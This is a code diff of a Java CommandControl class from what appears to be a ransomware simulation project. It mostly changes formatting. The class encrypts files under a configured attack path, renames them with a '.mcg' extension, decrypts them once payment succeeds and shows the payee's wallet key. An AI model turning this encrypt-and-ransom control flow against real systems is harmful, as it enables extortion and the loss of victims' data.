@@ -8,7 +8,7 @@ import console.Subscriber;
 import console.TextColor;
 import events.AttackEvent;
 import financial.Wallet;
-import person.*;
+import person.IConsoleUser;
 import pressurize.Pressurize;
 
 import java.security.PublicKey;
@@ -19,7 +19,8 @@ public class CommandControl extends Subscriber implements IConsoleUser {
     private final Console console;
     private final Pressurize pressurize;
     private final Wallet targetWallet;
-    public CommandControl(Integer id, Console console, Pressurize pressurize, Wallet targetWallet){
+
+    public CommandControl(Integer id, Console console, Pressurize pressurize, Wallet targetWallet) {
         super(id);
         this.reflector = new RansomwareReflector();
         this.reflector.setPath(Configuration.instance.pathToAttack);
@@ -28,13 +29,13 @@ public class CommandControl extends Subscriber implements IConsoleUser {
         this.targetWallet = targetWallet;
     }
 
-    private String encodePublicKey(PublicKey key){
+    private String encodePublicKey(PublicKey key) {
         return Base64.getEncoder().encodeToString(key.getEncoded());
     }
 
     @Subscribe
-    public void receive(AttackEvent event){
-        switch (event.getTask()){
+    public void receive(AttackEvent event) {
+        switch (event.getTask()) {
             case CL_LAUNCH -> {
                 this.reflector.encrypt();
                 this.reflector.rename(".mcg", true);
@@ -43,13 +44,13 @@ public class CommandControl extends Subscriber implements IConsoleUser {
             }
             case M_TRANSACTIONSUCCESS -> {
                 //if(event.getTask() == ConsoleCorrespondation.M_TRANSACTIONSUCCESS){
-                    this.reflector.decrypt();
-                    this.reflector.rename(".mcg", false);
-                    this.pressurize.setPaid(true);
+                this.reflector.decrypt();
+                this.reflector.rename(".mcg", false);
+                this.pressurize.setPaid(true);
                 //}
             }
             case CL_SHOWRECIPIENT -> {
-                ConsoleCorrespondation.M_SHOWRECIPIENT.setValue(ConsoleCorrespondation.M_SHOWRECIPIENT.getValue()+this.targetWallet.getPublicKey().toString());
+                ConsoleCorrespondation.M_SHOWRECIPIENT.setValue(ConsoleCorrespondation.M_SHOWRECIPIENT.getValue() + this.encodePublicKey(this.targetWallet.getPublicKey()));
                 this.writeToConsole(ConsoleCorrespondation.M_SHOWRECIPIENT, TextColor.GREEN);
             }
         }
@@ -57,7 +58,7 @@ public class CommandControl extends Subscriber implements IConsoleUser {
 
     @Override
     public void writeToConsole(ConsoleCorrespondation text, TextColor color) {
-            this.console.writeln(text, color);
+        this.console.writeln(text, color);
     }
 
     public void writeToConsole(ConsoleCorrespondation text) {
